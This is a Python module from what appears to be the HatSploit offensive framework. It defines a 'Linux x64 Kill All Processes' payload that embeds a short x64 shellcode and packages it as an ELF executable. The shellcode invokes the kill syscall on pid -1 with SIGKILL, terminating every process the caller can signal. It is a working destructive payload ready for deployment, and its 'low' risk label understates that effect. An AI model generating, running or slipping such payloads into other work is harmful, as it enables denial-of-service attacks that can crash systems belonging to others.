#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.payload import Payload
from utils.payload.payload import PayloadGenerator


class HatSploitPayload(Payload, PayloadGenerator):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Kill All Processes",
        'Payload': "linux/x64/kill_all",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Kill all processes payload for Linux x64.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    options = {
        'FORMAT': {
            'Description': "Executable format.",
            'Value': "elf",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        executable_format = self.parse_options(self.options)

        if executable_format not in self.formats.keys():
            self.output_error("Invalid executable format!")
            return

        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
        )

        self.output_process("Generating payload...")
        payload = self.generate(executable_format, 'x64', shellcode)

        return payload
